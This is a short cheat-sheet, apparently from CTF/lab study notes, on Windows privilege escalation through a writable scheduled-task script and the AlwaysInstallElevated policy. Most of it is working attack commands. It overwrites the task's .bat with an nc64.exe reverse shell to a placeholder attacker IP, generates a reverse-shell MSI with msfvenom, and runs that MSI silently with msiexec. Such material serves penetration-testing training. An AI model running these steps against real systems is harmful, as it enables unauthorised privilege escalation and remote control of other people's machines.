# Quick misconfiguration wins

Escalate through misconfigurations

1. Scheduled tasks
2. AlwaysInstallElevated

## Examples

### Scheduled tasks

1. List scheduled tasks:

```text
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
...
```

The `Task To Run` is of interest. If the current user can modify or overwrite the executable, we can control what gets executed by the `taskusr1` user, giving a simple privilege escalation.

2. Check the file permissions on the executable:

```text
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

In this case, the `BUILTIN\Users` group has full access (F) over the task's binary. This means we can modify the `.bat` file and insert any payload.

Change the `.bat` file to spawn a reverse shell:

```text
C:\> echo c:\tools\nc64.exe -e cmd.exe <IP address attack machine> 4444 > C:\tasks\schtask.bat
```

And start a listener on the attack machine:

```text
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with `taskusr1` privileges. Depending on when the task is scheduled to run, this may take a looong time. 

### AlwaysInstallElevated

1. Query the registry values:

```text
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Both should be set for this exploitation to work.

2. Generate an evil `.msi` file using `msfvenom`:

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=<port-number> -f msi -o evil.msi
```
Run the Metasploit Handler module configured accordingly.

3. Transfer the file to `C:\Windows\Temp` on the target machine. 
4. Run the installer with the command below and receive the reverse shell:

```text
C:\> msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

## Notes

These belong more to the realm of CTF events rather than real world scenarios.

* Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it is using a modifiable binary.
* Windows installer files (`.msi` files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. And they can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow for generating a malicious `.msi` file that would run with admin privileges.